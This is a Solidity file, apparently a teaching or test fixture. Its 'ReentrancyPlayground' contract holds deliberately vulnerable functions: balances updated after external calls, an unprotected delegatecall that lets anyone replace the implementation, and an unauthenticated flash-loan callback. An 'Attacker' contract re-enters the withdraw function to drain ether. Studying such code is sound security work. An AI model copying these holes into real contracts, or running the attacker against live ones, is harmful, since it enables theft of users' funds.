// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC777Like {
    function send(address to, uint256 amount, bytes calldata data) external;
}

interface IERC721Like {
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

contract ReentrancyPlayground {
    mapping(address => uint256) public ethBalance;
    mapping(address => uint256) public tokenBalance;
    address public impl;
    address public owner;
    IERC20Like public exampleToken;

    constructor(address _impl, address _token) {
        impl = _impl;
        exampleToken = IERC20Like(_token);
        owner = msg.sender;
    }

    function simpleCallWithdraw(uint256 amount) external {
        require(ethBalance[msg.sender] >= amount, "insufficient");
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "send failed");
        ethBalance[msg.sender] -= amount;
    }

    function optimisticTransferWithdraw(uint256 amount) external {
        require(ethBalance[msg.sender] >= amount, "insufficient");
        payable(msg.sender).transfer(amount);
        ethBalance[msg.sender] -= amount;
    }

    function sendAndAssume(uint256 amount) external {
        require(ethBalance[msg.sender] >= amount, "insufficient");
        bool ok = payable(msg.sender).send(amount);
        require(ok, "send failed");
        ethBalance[msg.sender] -= amount;
    }

    function externalThenSetBalance(address ext, uint256 newBalance) external {
        (bool ok, ) = ext.call(abi.encodeWithSignature("noop()"));
        require(ok);
        ethBalance[msg.sender] = newBalance;
    }

    function delegatecallExecute(address newImpl, bytes calldata data) external {
        impl = newImpl;
        (bool ok, ) = impl.delegatecall(data);
        require(ok, "delegatecall failed");
    }

    function erc777StyleSend(address token, address to, uint256 amount) external {
        IERC777Like(token).send(to, amount, "");
        tokenBalance[msg.sender] -= amount;
    }

    function nftSafeTransferThenUpdate(address nft, address to, uint256 tokenId) external {
        IERC721Like(nft).safeTransferFrom(address(this), to, tokenId);
    }

    receive() external payable {
        if (address(exampleToken) != address(0)) {
            (bool ok, ) = address(exampleToken).call(abi.encodeWithSignature("totalSupply()"));
            ok;
        }
    }

    function flashLoanCallback(address token, uint256 amount, bytes calldata) external returns (bool) {
        exampleToken.transfer(msg.sender, amount);
        return true;
    }

    IHelper public helper;
    modifier extBefore() {
        if (address(helper) != address(0)) {
            helper.before();
        }
        _;
        if (address(helper) != address(0)) {
            helper.afterHook();
        }
    }

    function modifyWithExternal(uint256 v) external extBefore {
        ethBalance[msg.sender] = v;
    }

    bool private locked;
    function fixedWithdraw(uint256 amount) external {
        require(!locked, "reentrant");
        require(ethBalance[msg.sender] >= amount, "insufficient");
        locked = true;
        ethBalance[msg.sender] -= amount;
        (bool ok, ) = payable(msg.sender).call{value: amount}("");
        require(ok, "send failed");
        locked = false;
    }

    function fund() external payable { ethBalance[msg.sender] += msg.value; }
    function setHelper(address _h) external { require(msg.sender == owner); helper = IHelper(_h); }
    function setToken(address _t) external { require(msg.sender == owner); exampleToken = IERC20Like(_t); }
    function setImpl(address _i) external { require(msg.sender == owner); impl = _i; }
}

contract Attacker {
    ReentrancyPlayground public target;
    address public owner;

    constructor(address payable _target) {
        target = ReentrancyPlayground(_target);
        owner = msg.sender;
    }

    function depositToTarget() external payable {
        (bool ok, ) = address(target).call{value: msg.value}(abi.encodeWithSignature("fund()"));
        require(ok);
    }

    function attackWithdraw(uint256 amount) external {
        (bool ok, ) = address(target).call(abi.encodeWithSignature("simpleCallWithdraw(uint256)", amount));
        ok;
    }

    function attackOptimisticTransfer(uint256 amount) external {
        (bool ok, ) = address(target).call(
            abi.encodeWithSignature("optimisticTransferWithdraw(uint256)", amount)
        );
        require(ok, "attack failed");
    }

    receive() external payable {
        uint256 tBal = address(target).balance;
        if (tBal >= 1 ether) {
            (bool ok, ) = address(target).call(abi.encodeWithSignature("simpleCallWithdraw(uint256)", 1 ether));
            ok;
        }
    }

    function drain() external {
        payable(owner).transfer(address(this).balance);
    }
}

interface IHelper {
    function before() external;
    function afterHook() external;
}
